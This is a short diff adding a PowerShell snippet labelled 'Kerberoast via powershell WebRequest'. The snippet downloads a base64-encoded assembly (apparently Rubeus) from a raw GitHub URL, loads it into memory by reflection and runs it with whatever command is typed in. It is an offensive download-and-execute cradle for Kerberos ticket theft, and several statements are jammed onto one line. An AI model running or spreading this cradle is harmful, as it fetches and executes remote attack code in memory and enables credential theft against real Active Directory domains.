@@ -1,0 +1,4 @@
+Kerberoast via powershell WebRequest.
+
+$Command = Read-Host "Enter command"
+$Rubeus = (Invoke-WebRequest -URI 'https://raw.githubusercontent.com/Fa1c0/Tools/main/main.txt').content $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($Rubeus)) [Rubeus.Program]::Main($Command.Split())
